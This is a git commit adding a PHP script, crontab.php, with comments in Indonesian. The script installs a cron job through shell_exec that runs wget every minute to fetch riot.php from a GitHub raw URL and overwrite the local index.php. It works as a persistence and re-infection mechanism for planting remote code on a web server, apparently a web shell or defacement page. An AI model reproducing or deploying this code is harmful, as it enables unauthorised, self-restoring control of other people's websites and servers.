9a48188a3bf3de0b698391faa8646e9ce884526b
R10T <85335450+sunshine0110@users.noreply.github.com>
2024-02-28 14:43:13 -0500

    Create crontab.php

---
+++ crontab.php
@@ -0,0 +1,22 @@
+<?php
+// URL yang ingin Anda unduh
+$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/nopass/main/riot.php';
+
+// Direktori tempat skrip PHP ini diakses
+$currentDirectory = dirname(__FILE__);
+
+// Buat perintah wget
+$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/index.php');
+
+// Tugas Cron untuk mengunduh file setiap 30 detik
+$downloadCronCommand = '* * * * * ' . $downloadCommand;
+
+// Tambahkan tugas Cron yang baru
+$result = shell_exec('(crontab -l ; echo "'.$downloadCronCommand.'") | crontab -');
+
+if ($result === false) {
+    echo 'Gagal menambahkan tugas Cron untuk mengunduh file.';
+} else {
+    echo 'Tugas Cron untuk mengunduh file berhasil ditambahkan.';
+}
+?>
